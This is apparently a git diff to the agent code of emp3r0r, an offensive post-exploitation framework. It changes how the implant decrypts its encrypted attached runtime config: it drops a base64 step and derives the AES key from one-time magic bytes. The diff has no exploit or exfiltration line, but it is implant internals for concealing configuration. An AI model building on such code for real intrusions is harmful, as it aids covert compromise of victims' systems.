@@ -1,7 +1,6 @@
 package agent
 
 import (
-	"encoding/base64"
 	"fmt"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -17,15 +16,9 @@ func ApplyRuntimeConfig() (err error) {
 		return fmt.Errorf("read config: %v", err)
 	}
 
-	// base64 decode
-	decoded_json_data, err := base64.StdEncoding.DecodeString(string(readJsonData))
-	if err != nil {
-		return fmt.Errorf("ApplyRuntimeConfig: base64 decode: %v", err)
-	}
-
 	// decrypt attached JSON file
-	key := tun.GenAESKey(emp3r0r_data.MagicString)
-	jsonData := tun.AESDecryptRaw(key, decoded_json_data)
+	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
+	jsonData := tun.AESDecryptRaw(key, readJsonData)
 	if jsonData == nil {
 		err = fmt.Errorf("Decrypt JSON with key %s failed", key)
 		return
